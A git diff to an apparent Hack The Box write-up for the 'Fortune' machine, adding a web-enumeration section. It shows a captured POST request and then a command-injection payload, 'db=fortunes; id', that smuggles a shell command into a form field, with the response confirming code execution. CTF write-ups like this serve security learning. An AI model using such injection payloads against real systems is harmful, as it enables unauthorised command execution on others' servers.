@@ -26,7 +26,7 @@ categories:
       	padding-left: 19px;
 	}
 	
-	.help-img {
+	.fortune-img {
 		max-width: 75%;
 	}
 
@@ -72,10 +72,80 @@ PORT     STATE SERVICE VERSION
 |_ssl-date: TLS randomness does not represent time
 </code></pre></div></div>
 
-So, it appears port `443` is HTTPS (as expected), but it requires an SSL certificate to access it. I'll leave it alone for now because of this. However, port `80` proves to be quite interesting. Here's what I discovered upon navigating to it:
+So, it appears port `443` is HTTPS (as expected), but it requires an SSL certificate to access it. I'll leave it alone for now because of this. However, port `80` proves to be quite interesting. 
 
-<!--Include screenshot of web fortunes here-->
+### Web Enumeration
+
+Here's what I discovered upon navigating to `http://10.10.10.127` in my browser:
+
+<img src="/assets/img/writeups/HTB-FORTUNE/fortune-homepage.PNG" class="fortune-img" alt="Hack The Box - Fortune Homepage">
 
 Hmm... 
 
 Let's try capturing a request with `Burp Suite!`
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+POST /select HTTP/1.1
+Host: 10.10.10.127
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.127/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+db=fortunes
+</code></pre></div></div>
+
+The `db` variable looks pretty spicy! 🌶️
+
+After running `wfuzz`, I discovered I could append a semi colon (;) and execute commands on the box, like so:
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+POST /select HTTP/1.1
+Host: 10.10.10.127
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://10.10.10.127/
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+db=fortunes; id
+</code></pre></div></div>
+
+And the response:
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+HTTP/1.1 200 OK
+Connection: close
+Content-Type: text/html; charset=utf-8
+Date: Wed, 24 Jul 2019 12:27:19
+<!DOCTYPE html>
+<html>
+<head>
+<title>Your fortune</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+</head>
+<body>
+<h2>Your fortune is:</h2>
+<p><pre>
+
+uid=512(_fortune) gid=512(_fortune) groups=512(_fortune)
+
+
+</pre><p>
+<p>Try <a href='/'>again</a>!</p>
+</body>
+</code></pre></div></div>
+
+Nice! We have code execution. Let's have a look around to see what else we can find.
